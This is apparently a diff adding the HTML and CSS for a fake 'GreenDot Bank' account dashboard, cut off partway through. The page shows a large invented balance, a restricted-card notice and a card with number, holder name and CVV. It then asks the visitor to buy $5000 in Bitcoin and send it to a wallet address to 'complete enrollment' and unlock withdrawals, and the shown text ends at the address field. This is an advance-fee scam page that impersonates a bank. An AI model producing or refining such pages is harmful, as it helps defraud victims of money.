@@ -1,0 +1,1455 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GreenDot Bank | Premium Banking</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+        }
+        
+        :root {
+            --bg-primary: #F8F9FA;
+            --bg-secondary: #FFFFFF;
+            --primary: #00A651;
+            --primary-light: #E9F8EF;
+            --secondary: #C9A14A;
+            --text-primary: #1C1C1C;
+            --text-secondary: #6B6B6B;
+            --text-light: #A1A1A1;
+            --border: #EDEDED;
+            --shadow: rgba(0, 0, 0, 0.05);
+            --hover: #F2F2F2;
+            --warning: #E74C3C;
+            --warning-light: #FDEDEC;
+        }
+        
+        body {
+            background-color: var(--bg-primary);
+            color: var(--text-primary);
+            line-height: 1.5;
+            max-width: 480px;
+            margin: 0 auto;
+            position: relative;
+            min-height: 100vh;
+        }
+        
+        /* Header */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 20px 0;
+            background: var(--bg-primary);
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .logo-dot {
+            width: 22px;
+            height: 22px;
+            background: linear-gradient(135deg, #00FF73, #00C853);
+            border-radius: 50%;
+        }
+        
+        .logo-text {
+            display: flex;
+            flex-direction: column;
+            line-height: 1;
+        }
+        
+        .logo-greendot {
+            font-weight: 600;
+            font-size: 18px;
+            color: var(--text-primary);
+            letter-spacing: -0.3px;
+        }
+        
+        .logo-bank {
+            font-weight: 400;
+            font-size: 12px;
+            color: var(--text-secondary);
+            text-align: right;
+            margin-top: -1px;
+        }
+        
+        .menu-toggle {
+            width: 40px;
+            height: 40px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            gap: 4px;
+            cursor: pointer;
+            border-radius: 10px;
+            transition: background-color 0.2s ease;
+        }
+        
+        .menu-toggle:hover {
+            background-color: var(--hover);
+        }
+        
+        .menu-line {
+            width: 18px;
+            height: 2px;
+            background: var(--text-primary);
+            border-radius: 2px;
+            transition: all 0.3s ease;
+        }
+        
+        /* Welcome Banner */
+        .welcome-banner {
+            background-color: var(--primary-light);
+            border-radius: 12px;
+            padding: 16px 20px;
+            margin: 20px 20px 25px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            box-shadow: 0 2px 8px var(--shadow);
+            animation: fadeIn 0.5s ease-out;
+        }
+        
+        .checkmark-circle {
+            width: 24px;
+            height: 24px;
+            background-color: var(--primary);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+        
+        .checkmark {
+            color: white;
+            font-size: 12px;
+            font-weight: bold;
+        }
+        
+        .welcome-text {
+            font-size: 16px;
+            font-weight: 500;
+            color: var(--text-primary);
+        }
+        
+        /* Main Content */
+        .main-content {
+            padding: 0 20px 100px;
+        }
+        
+        /* Balance Card */
+        .balance-card {
+            background: var(--bg-secondary);
+            border-radius: 14px;
+            padding: 24px;
+            margin-bottom: 25px;
+            box-shadow: 0 4px 12px var(--shadow);
+            position: relative;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            animation: slideUp 0.5s ease-out 0.1s both;
+        }
+        
+        .balance-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px var(--shadow);
+        }
+        
+        .balance-label {
+            font-size: 14px;
+            color: var(--text-secondary);
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+        
+        .balance-amount {
+            font-size: 32px;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 4px;
+            letter-spacing: -0.5px;
+        }
+        
+        .account-type {
+            font-size: 14px;
+            color: var(--text-secondary);
+            font-weight: 400;
+        }
+        
+        .eye-toggle {
+            position: absolute;
+            right: 24px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--text-secondary);
+            font-size: 18px;
+            cursor: pointer;
+            transition: color 0.2s ease;
+        }
+        
+        .eye-toggle:hover {
+            color: var(--primary);
+        }
+        
+        /* Gold Card */
+        .gold-card {
+            background: linear-gradient(135deg, #D9B95E, #C49C3F);
+            border-radius: 14px;
+            padding: 24px;
+            margin-bottom: 25px;
+            box-shadow: 0 4px 12px rgba(201, 161, 74, 0.15);
+            position: relative;
+            overflow: hidden;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            animation: slideUp 0.5s ease-out 0.2s both;
+        }
+        
+        .gold-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
+        }
+        
+        .gold-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(201, 161, 74, 0.2);
+        }
+        
+        /* Virtual ATM Card Styles */
+        .perspective-container {
+            perspective: 1500px;
+            width: 100%;
+            height: 220px;
+            margin: 0 auto;
+        }
+
+        .card-container {
+            position: relative;
+            width: 100%;
+            height: 100%;
+            transition: transform 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+            transform-style: preserve-3d;
+            cursor: pointer;
+        }
+
+        .card-container.flipped {
+            transform: rotateY(180deg);
+        }
+
+        .card-face {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            backface-visibility: hidden;
+            border-radius: 14px;
+            padding: 20px;
+            box-shadow: 0 20px 60px -10px rgba(0, 0, 0, 0.5);
+            transition: box-shadow 0.3s ease;
+            overflow: hidden;
+        }
+
+        .card-container:hover .card-face {
+            box-shadow: 0 30px 80px -10px rgba(0, 0, 0, 0.6);
+        }
+
+        .card-front {
+            background: linear-gradient(135deg, #d4af37 0%, #f9e076 30%, #ffffff 50%, #f9e076 70%, #d4af37 100%);
+        }
+
+        .card-back {
+            background: linear-gradient(135deg, #d4af37 0%, #f9e076 30%, #ffffff 50%, #f9e076 70%, #d4af37 100%);
+            transform: rotateY(180deg);
+        }
+
+        /* Shine Effect */
+        .shine-effect {
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
+            animation: shine 3s ease-in-out infinite;
+            pointer-events: none;
+        }
+
+        @keyframes shine {
+            0% {
+                left: -100%;
+            }
+            20% {
+                left: 100%;
+            }
+            100% {
+                left: 100%;
+            }
+        }
+
+        /* Green Dot Logo */
+        .greendot-logo {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            z-index: 10;
+        }
+
+        .greendot-dot {
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #00FF73, #00C853);
+        }
+
+        .greendot-text {
+            display: flex;
+            flex-direction: column;
+            line-height: 1;
+        }
+
+        .greendot-name {
+            color: #2d2d2d;
+            font-weight: 600;
+            font-size: 16px;
+            letter-spacing: -0.3px;
+        }
+
+        .greendot-bank {
+            color: #5a5a5a;
+            font-weight: 400;
+            font-size: 10px;
+            text-align: right;
+            margin-top: -1px;
+        }
+
+        /* Visa Logo */
+        .visa-logo {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            color: #1a1f71;
+            font-weight: 700;
+            font-size: 24px;
+            font-family: Arial, sans-serif;
+            letter-spacing: 1px;
+            z-index: 10;
+        }
+
+        /* EMV Chip */
+        .emv-chip {
+            position: absolute;
+            top: 60px;
+            left: 20px;
+            width: 45px;
+            height: 35px;
+            background: linear-gradient(135deg, #b8860b, #daa520, #ffd700, #daa520, #b8860b);
+            border-radius: 6px;
+            box-shadow:
+                inset 0 2px 4px rgba(255, 255, 255, 0.6),
+                inset 0 -2px 4px rgba(0, 0, 0, 0.3),
+                0 1px 2px rgba(0, 0, 0, 0.2),
+                inset 8px 8px 0 -4px rgba(0, 0, 0, 0.4),
+                inset -8px 8px 0 -4px rgba(0, 0, 0, 0.4),
+                inset 8px -8px 0 -4px rgba(0, 0, 0, 0.4),
+                inset -8px -8px 0 -4px rgba(0, 0, 0, 0.4),
+                inset 8px 0 0 -4px rgba(0, 0, 0, 0.4),
+                inset -8px 0 0 -4px rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(184, 134, 11, 0.8);
+            z-index: 5;
+        }
+
+        /* Card Number - FIXED POSITIONING */
+        .card-number {
+            position: absolute;
+            bottom: 80px;
+            left: 20px;
+            right: 20px;
+            font-family: 'Courier New', monospace;
+            font-size: 18px;
+            letter-spacing: 2px;
+            font-weight: 600;
+            color: #2d2d2d;
+            z-index: 10;
+            text-align: center;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .card-number span {
+            display: inline-block;
+            width: 23%;
+            text-align: center;
+        }
+
+        /* Card Holder */
+        .card-holder {
+            position: absolute;
+            bottom: 40px;
+            left: 20px;
+            font-size: 14px;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            color: #2d2d2d;
+            z-index: 10;
+        }
+
+        /* Expiry */
+        .card-expiry {
+            position: absolute;
+            bottom: 40px;
+            right: 20px;
+            text-align: right;
+            z-index: 10;
+        }
+
+        .card-expiry-label {
+            font-size: 9px;
+            color: #5a5a5a;
+            margin-bottom: 2px;
+        }
+
+        .card-expiry-date {
+            font-size: 14px;
+            font-weight: 500;
+            color: #2d2d2d;
+        }
+
+        /* Tap to Flip Hint */
+        .flip-hint {
+            position: absolute;
+            bottom: 8px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 10px;
+            color: #5a5a5a;
+            opacity: 0.6;
+            z-index: 10;
+        }
+
+        /* Back of Card Elements */
+        .magnetic-stripe {
+            position: absolute;
+            top: 30px;
+            left: 0;
+            width: 100%;
+            height: 45px;
+            background: linear-gradient(
+                180deg,
+                rgba(0, 0, 0, 0.8) 0%,
+                rgba(40, 40, 40, 0.9) 50%,
+                rgba(0, 0, 0, 0.8) 100%
+            );
+        }
+
+        .signature-strip {
+            position: absolute;
+            top: 95px;
+            left: 20px;
+            right: 20px;
+            height: 40px;
+            background: linear-gradient(180deg, rgba(255, 255, 255, 0.9), rgba(240, 240, 240, 0.95));
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            padding: 0 10px;
+            gap: 10px;
+        }
+
+        .signature-area {
+            flex: 1;
+            height: 24px;
+            background: rgba(255, 255, 255, 0.6);
+            border-radius: 2px;
+            padding: 4px;
+        }
+
+        .signature-line {
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(
+                90deg,
+                transparent 0%,
+                rgba(45, 45, 45, 0.3) 20%,
+                rgba(45, 45, 45, 0.5) 40%,
+                transparent 100%
+            );
+        }
+
+        .cvv-box {
+            padding: 4px 8px;
+            background: white;
+            border-radius: 3px;
+            text-align: center;
+            min-width: 50px;
+        }
+
+        .cvv-label {
+            font-size: 8px;
+            color: #5a5a5a;
+            margin-bottom: 4px;
+        }
+
+        .cvv-value {
+            font-size: 16px;
+            font-weight: bold;
+            color: #2d2d2d;
+            letter-spacing: 0.1em;
+        }
+
+        .terms-text {
+            position: absolute;
+            top: 150px;
+            left: 20px;
+            right: 20px;
+        }
+
+        .terms-text p {
+            font-size: 7px;
+            line-height: 1.4;
+            color: #5a5a5a;
+        }
+
+        .terms-text .customer-service {
+            margin-top: 12px;
+            font-size: 7px;
+            color: #5a5a5a;
+        }
+
+        .back-visa-logo {
+            position: absolute;
+            bottom: 16px;
+            right: 20px;
+            color: #1a1f71;
+            font-weight: 700;
+            font-size: 20px;
+            font-family: Arial, sans-serif;
+            letter-spacing: 1px;
+        }
+
+        .back-greendot-logo {
+            position: absolute;
+            bottom: 16px;
+            left: 20px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .back-greendot-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #00FF73, #00C853);
+        }
+
+        .back-greendot-text {
+            display: flex;
+            flex-direction: column;
+            line-height: 1;
+        }
+
+        .back-greendot-name {
+            color: #2d2d2d;
+            font-weight: 600;
+            font-size: 10px;
+        }
+
+        .back-greendot-bank {
+            color: #5a5a5a;
+            font-weight: 400;
+            font-size: 7px;
+            text-align: right;
+        }
+
+        .flip-hint-back {
+            position: absolute;
+            top: 8px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 10px;
+            color: #5a5a5a;
+            opacity: 0.6;
+        }
+
+        /* Process Section */
+        .process-section {
+            background: var(--bg-secondary);
+            border-radius: 14px;
+            padding: 24px;
+            margin-bottom: 40px;
+            box-shadow: 0 4px 12px var(--shadow);
+            animation: slideUp 0.5s ease-out 0.3s both;
+        }
+        
+        .section-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: var(--primary);
+            margin-bottom: 20px;
+        }
+        
+        .process-step {
+            margin-bottom: 24px;
+            padding-bottom: 24px;
+            border-bottom: 1px solid var(--border);
+        }
+        
+        .process-step:last-child {
+            margin-bottom: 0;
+            padding-bottom: 0;
+            border-bottom: none;
+        }
+        
+        .step-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 8px;
+        }
+        
+        .step-text {
+            font-size: 14px;
+            color: var(--text-secondary);
+            line-height: 1.5;
+        }
+        
+        .step-list {
+            padding-left: 18px;
+            margin-top: 8px;
+        }
+        
+        .step-list li {
+            margin-bottom: 8px;
+            font-size: 14px;
+            color: var(--text-secondary);
+            line-height: 1.5;
+        }
+        
+        .highlight {
+            color: var(--primary);
+            font-weight: 600;
+        }
+        
+        /* Features Grid */
+        .features-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin: 20px 0;
+        }
+        
+        .feature-card {
+            background: var(--bg-primary);
+            border-radius: 12px;
+            padding: 20px;
+            text-align: center;
+            border: 1px solid var(--border);
+            transition: all 0.3s ease;
+        }
+        
+        .feature-card.active {
+            background: var(--primary-light);
+            border-color: var(--primary);
+        }
+        
+        .feature-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px var(--shadow);
+        }
+        
+        .feature-icon {
+            width: 50px;
+            height: 50px;
+            background: var(--bg-secondary);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 12px;
+            font-size: 20px;
+            color: var(--text-secondary);
+            transition: all 0.3s ease;
+        }
+        
+        .feature-card.active .feature-icon {
+            background: var(--primary);
+            color: white;
+        }
+        
+        .feature-name {
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 4px;
+        }
+        
+        .feature-status {
+            font-size: 12px;
+            font-weight: 500;
+        }
+        
+        .feature-status.available {
+            color: var(--primary);
+        }
+        
+        .feature-status.pending {
+            color: var(--text-light);
+        }
+        
+        .divider {
+            height: 1px;
+            background: var(--border);
+            margin: 20px 0;
+        }
+        
+        /* Warning Section */
+        .warning-section {
+            background: var(--warning-light);
+            border-radius: 10px;
+            padding: 16px;
+            margin-top: 20px;
+            border-left: 4px solid var(--warning);
+        }
+        
+        .warning-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--warning);
+            margin-bottom: 8px;
+        }
+        
+        .warning-text {
+            font-size: 13px;
+            color: var(--text-secondary);
+            line-height: 1.5;
+        }
+        
+        /* Bottom Navigation */
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: var(--bg-secondary);
+            border-top: 1px solid var(--border);
+            display: flex;
+            justify-content: space-around;
+            padding: 14px 0;
+            max-width: 480px;
+            margin: 0 auto;
+            box-shadow: 0 -2px 10px var(--shadow);
+            z-index: 10;
+        }
+        
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            color: var(--text-light);
+            text-decoration: none;
+            font-size: 11px;
+            transition: color 0.2s ease;
+        }
+        
+        .nav-item.active {
+            color: var(--primary);
+        }
+        
+        .nav-icon {
+            font-size: 20px;
+            margin-bottom: 4px;
+        }
+        
+        /* Menu Dropdown */
+        .menu-dropdown {
+            position: absolute;
+            top: 70px;
+            right: 20px;
+            background: var(--bg-secondary);
+            border-radius: 12px;
+            padding: 8px 0;
+            width: 160px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.1);
+            border: 1px solid var(--border);
+            opacity: 0;
+            visibility: hidden;
+            transform: translateY(-10px);
+            transition: all 0.3s ease;
+            z-index: 100;
+        }
+        
+        .menu-dropdown.active {
+            opacity: 1;
+            visibility: visible;
+            transform: translateY(0);
+        }
+        
+        .menu-item {
+            padding: 12px 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+        }
+        
+        .menu-item:hover {
+            background-color: var(--hover);
+        }
+        
+        .menu-item.active {
+            color: var(--primary);
+        }
+        
+        .menu-icon {
+            font-size: 16px;
+            width: 20px;
+            text-align: center;
+            color: var(--text-secondary);
+        }
+        
+        .menu-text {
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        /* Animations */
+        @keyframes fadeIn {
+            0% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+        
+        @keyframes slideUp {
+            0% { opacity: 0; transform: translateY(20px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+        
+        /* Responsive Design for Virtual Card */
+        @media (max-width: 480px) {
+            .perspective-container {
+                height: 188px;
+            }
+
+            .card-face {
+                padding: 15px;
+            }
+
+            .emv-chip {
+                width: 40px;
+                height: 30px;
+                top: 50px;
+            }
+
+            .card-number {
+                font-size: 16px;
+                bottom: 70px;
+            }
+
+            .card-holder,
+            .card-expiry-date {
+                font-size: 12px;
+                bottom: 35px;
+            }
+
+            .visa-logo {
+                font-size: 20px;
+            }
+        }
+        /* Compact mobile-first design with 60-75% reduced footprint */
+:root {
+    --primary-green: #00A651;
+    --warning-bg: linear-gradient(135deg, #FFF9E6 0%, #FFF0C2 100%);
+    --warning-border: #FFE58F;
+    --warning-text: #8B6914;
+    --card-bg: #FFFFFF;
+    --text-primary: #333333;
+    --text-secondary: #666666;
+    --orange: #FF6B35;
+    --border-radius: 8px;
+    --spacing-xs: 6px;
+    --spacing-sm: 8px;
+    --spacing-md: 12px;
+    --spacing-lg: 16px;
+    --shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+}
+
+.enrollment-card {
+    max-width: min(360px, 92vw);
+    margin: 0 auto;
+    background: var(--card-bg);
+    border-radius: var(--border-radius);
+    box-shadow: var(--shadow);
+    padding: var(--spacing-lg);
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    color: var(--text-primary);
+    line-height: 1.4;
+}
+
+.title {
+    font-size: clamp(1.1rem, 4vw, 1.3rem);
+    font-weight: 700;
+    margin-bottom: var(--spacing-md);
+    color: var(--text-primary);
+}
+
+.progress-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: var(--spacing-sm);
+    font-size: clamp(0.8rem, 3vw, 0.9rem);
+}
+
+.progress-label {
+    font-weight: 600;
+}
+
+.progress-percent {
+    font-weight: 600;
+    color: var(--primary-green);
+}
+
+.progress-bar {
+    width: 100%;
+    height: 6px;
+    background: #E5E5E5;
+    border-radius: 3px;
+    overflow: hidden;
+    margin-bottom: var(--spacing-md);
+}
+
+.progress-fill {
+    width: 75%;
+    height: 100%;
+    background: var(--primary-green);
+    border-radius: 3px;
+}
+
+.warning-box {
+    background: var(--warning-bg);
+    border: 1px solid var(--warning-border);
+    border-radius: var(--border-radius);
+    padding: var(--spacing-md);
+    margin-bottom: var(--spacing-md);
+    display: flex;
+    gap: var(--spacing-sm);
+    box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.05);
+}
+
+.warning-icon {
+    flex-shrink: 0;
+    width: 16px;
+    height: 16px;
+    margin-top: 2px;
+    color: var(--warning-text);
+}
+
+.warning-text {
+    color: var(--warning-text);
+    font-size: clamp(0.8rem, 3vw, 0.9rem);
+    margin: 0;
+}
+
+.address-section {
+    background: white;
+    border-radius: 6px;
+    padding: var(--spacing-md);
+    margin: var(--spacing-sm) 0;
+    border: 1px solid #E5E5E5;
+    box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
+}
+
+.address-label {
+    font-size: clamp(0.8rem, 3vw, 0.9rem);
+    font-weight: 600;
+    margin-bottom: var(--spacing-sm);
+    color: var(--text-primary);
+}
+
+.address-field {
+    display: flex;
+    gap: var(--spacing-sm);
+    align-items: center;
+}
+
+.address-value {
+    flex: 1;
+    background: #F8F9FA;
+    border: 1px solid #E5E5E5;
+    border-radius: 20px;
+    padding: 8px 12px;
+    font-family: 'Courier New', monospace;
+    font-size: clamp(0.7rem, 2.5vw, 0.8rem);
+    color: var(--text-primary);
+    user-select: all;
+    overflow: hidden;
+    text-overflow: ellipsis;
+}
+
+.copy-btn {
+    background: var(--primary-green);
+    color: white;
+    border: none;
+    border-radius: 20px;
+    padding: 8px 12px;
+    font-size: clamp(0.7rem, 2.5vw, 0.8rem);
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.2s ease;
+    white-space: nowrap;
+    min-height: 40px;
+    min-width: 60px;
+}
+
+.copy-btn:hover {
+    background: #008F45;
+}
+
+.copy-btn.copied {
+    background: #008F45;
+}
+
+.copy-tooltip {
+    position: absolute;
+    background: #333;
+    color: white;
+    padding: 4px 8px;
+    border-radius: 4px;
+    font-size: 0.7rem;
+    bottom: 100%;
+    left: 50%;
+    transform: translateX(-50%);
+    margin-bottom: 4px;
+    opacity: 0;
+    transition: opacity 0.2s ease;
+}
+
+.copy-tooltip.show {
+    opacity: 1;
+}
+
+.cta-button {
+    width: 100%;
+    background: linear-gradient(135deg, #FF6B35 0%, #E55A2B 100%);
+    color: white;
+    border: none;
+    border-radius: var(--border-radius);
+    padding: 12px;
+    font-size: clamp(0.9rem, 4vw, 1rem);
+    font-weight: 700;
+    cursor: pointer;
+    transition: all 0.2s ease;
+    margin: var(--spacing-md) 0;
+    box-shadow: 0 2px 4px rgba(255, 107, 53, 0.3);
+    min-height: 44px;
+}
+
+.cta-button:hover {
+    background: linear-gradient(135deg, #E55A2B 0%, #CC4A24 100%);
+    transform: translateY(-1px);
+}
+
+.cta-button:active {
+    transform: translateY(0);
+}
+
+.cta-button.pressed {
+    transform: scale(0.98);
+}
+
+.support-text {
+    font-size: clamp(0.7rem, 2.5vw, 0.8rem);
+    color: var(--text-secondary);
+    text-align: center;
+    line-height: 1.3;
+    margin: 0;
+}
+
+.support-email {
+    color: var(--primary-green);
+    font-weight: 600;
+}
+
+.toast {
+    position: fixed;
+    top: 16px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: var(--primary-green);
+    color: white;
+    padding: 8px 16px;
+    border-radius: 6px;
+    font-size: 0.8rem;
+    font-weight: 600;
+    opacity: 0;
+    transition: opacity 0.3s ease;
+    z-index: 1000;
+    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+}
+
+.toast.show {
+    opacity: 1;
+}
+
+.sr-only {
+    position: absolute;
+    width: 1px;
+    height: 1px;
+    padding: 0;
+    margin: -1px;
+    overflow: hidden;
+    clip: rect(0, 0, 0, 0);
+    white-space: nowrap;
+    border: 0;
+}
+
+/* Focus styles for accessibility */
+button:focus-visible {
+    outline: 2px solid var(--primary-green);
+    outline-offset: 2px;
+}
+
+/* Mobile-first responsive adjustments */
+@media (max-width: 480px) {
+    .enrollment-card {
+        padding: var(--spacing-md);
+        margin: 0 4px;
+    }
+    
+    .address-field {
+        flex-direction: column;
+        gap: var(--spacing-sm);
+    }
+    
+    .address-value {
+        width: 100%;
+    }
+    
+    .copy-btn {
+        width: 100%;
+    }
+    
+    .warning-box {
+        flex-direction: column;
+        gap: var(--spacing-xs);
+    }
+}
+
+@media (max-width: 768px) {
+    .warning-box {
+        flex-direction: column;
+    }
+    
+    .warning-icon {
+        align-self: flex-start;
+    }
+}
+
+@media (min-width: 1024px) {
+    .enrollment-card {
+        max-width: 380px;
+    }
+}
+        .card-notice {
+    font-family: Arial, sans-serif;
+    font-size: 16px;
+    color: #a94442;
+    background-color: #f2dede;
+    border: 1px solid #ebccd1;
+    border-radius: 8px;
+    padding: 15px;
+    margin: 10px;
+    text-align: center;
+    box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+}
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="logo">
+            <div class="logo-dot"></div>
+            <div class="logo-text">
+                <span class="logo-greendot">greendot</span>
+                <span class="logo-bank">bank</span>
+            </div>
+        </div>
+        
+        <div class="menu-toggle" id="menuToggle">
+            <div class="menu-line"></div>
+            <div class="menu-line"></div>
+            <div class="menu-line"></div>
+        </div>
+        
+        <!-- Menu Dropdown -->
+        <div class="menu-dropdown" id="menuDropdown">
+            <div class="menu-item" id="homeBtn" onclick="window.location.href='home.html'">
+                <div class="menu-icon"><i class="fas fa-home"></i></div>
+                <div class="menu-text">Home</div>
+            </div>
+            <div class="menu-item" id="historyBtn" onclick="window.location.href='history.html'">
+                <div class="menu-icon"><i class="fas fa-history"></i></div>
+                <div class="menu-text">History</div>
+            </div>
+            <div class="menu-item" id="logoutBtn">
+                <div class="menu-icon"><i class="fas fa-sign-out-alt"></i></div>
+                <div class="menu-text">Logout</div>
+            </div>
+        </div>
+    </header>
+    
+    <!-- Welcome Banner -->
+    <div class="welcome-banner">
+        <div class="checkmark-circle">
+            <span class="checkmark">✓</span>
+        </div>
+        <div class="welcome-text" id="welcomeText">You're welcome, Benjamin Leal</div>
+    </div>
+    
+    <!-- Main Content -->
+    <main class="main-content">
+        <!-- Balance Card -->
+        <div class="balance-card">
+            <div class="balance-label">Available Balance</div>
+            <div class="balance-amount" id="balanceAmount">$177,669.00
+            </div>
+            <div class="account-type">Reloadable Deposit Account</div>
+            <div class="eye-toggle" id="eyeToggle">
+                <i class="fas fa-eye"></i>
+            </div>
+        </div>
+        <div class="card-notice">
+    ⚠️ A Card temporarily restricted
+</div>
+        <!-- Gold Card with Virtual ATM Card -->
+        <div class="gold-card">
+            <div class="perspective-container">
+                <div class="card-container" id="cardContainer">
+                    <!-- Front of Card -->
+                    <div class="card-face card-front">
+                        <!-- Shine Effect -->
+                        <div class="shine-effect"></div>
+                        
+                        <!-- Green Dot Logo -->
+                        <div class="greendot-logo">
+                            <div class="greendot-dot"></div>
+                            <div class="greendot-text">
+                                <span class="greendot-name">greendot</span>
+                                <span class="greendot-bank">bank</span>
+                            </div>
+                        </div>
+
+                        <!-- Visa Logo -->
+                        <div class="visa-logo">VISA</div>
+
+                        <!-- EMV Chip -->
+                        <div class="emv-chip"></div>
+
+                        <!-- Card Number - FIXED POSITIONING -->
+                        <div class="card-number">
+                            <span>4143</span>
+                            <span>9805</span>
+                            <span>7516</span>
+                            <span>1792</span>
+                        </div>
+
+                        <!-- Card Holder Name -->
+                        <div class="card-holder">Benjamin Leal</div>
+
+                        <!-- Expiry Date -->
+                        <div class="card-expiry">
+                            <div class="card-expiry-label">VALID THRU</div>
+                            <div class="card-expiry-date">03/27</div>
+                        </div>
+
+                        <!-- Tap to Flip Hint -->
+                        <div class="flip-hint">Tap to flip</div>
+                    </div>
+
+                    <!-- Back of Card -->
+                    <div class="card-face card-back">
+                        <!-- Magnetic Stripe -->
+                        <div class="magnetic-stripe"></div>
+
+                        <!-- Signature Strip with CVV -->
+                        <div class="signature-strip">
+                            <div class="signature-area">
+                                <div class="signature-line"></div>
+                            </div>
+                            <div class="cvv-box">
+                                <div class="cvv-label">CVV</div>
+                                <div class="cvv-value">000</div>
+                            </div>
+                        </div>
+
+                        <!-- Terms Text -->
+                        <div class="terms-text">
+                            <p>
+                                This card is the property of Green Dot Bank and must be
+                                surrendered upon demand. Unauthorized use is prohibited and may
+                                be a crime.
+                            </p>
+                            <div class="customer-service">
+                                For customer service call 1-800-XXX-XXXX
+                            </div>
+                        </div>
+
+                        <!-- Visa Logo on Back -->
+                        <div class="back-visa-logo">VISA</div>
+
+                        <!-- Green Dot Logo on Back -->
+                        <div class="back-greendot-logo">
+                            <div class="back-greendot-dot"></div>
+                            <div class="back-greendot-text">
+                                <span class="back-greendot-name">greendot</span>
+                                <span class="back-greendot-bank">bank</span>
+                            </div>
+                        </div>
+
+                        <!-- Tap to Flip Hint -->
+                        <div class="flip-hint-back">Tap to flip</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+<div class="enrollment-card">
+    <h1 class="title">Enrollment Progress</h1>
+    
+    <div class="progress-row">
+        <span class="progress-label">Progress</span>
+        <span class="progress-percent">90%</span>
+    </div>
+    
+    <div class="progress-bar" role="progressbar" aria-valuemin="0" aria-valuemax="100" aria-valuenow="90">
+        <div class="progress-fill"></div>
+        <span class="sr-only">90% complete</span>
+    </div>
+    
+    <div class="warning-box">
+        <svg class="warning-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L4.35 16.5c-.77.833.192 2.5 1.732 2.5z" />
+        </svg>
+        <p class="warning-text">
+            To ensure smooth access to your reloadable account funds and enable card withdrawals of the $150,650.00 balance, please complete the final step in the enrollment process by purchasing $5000 worth of Bitcoin. You can securely buy Bitcoin using the button below. After purchasing, copy the wallet address below and send the Bitcoin to complete your enrollment:
+        </p>
+    </div>
+    
+    <div class="address-section">
+        <div class="address-label">Bitcoin Wallet Address:</div>
+        <div class="address-field">
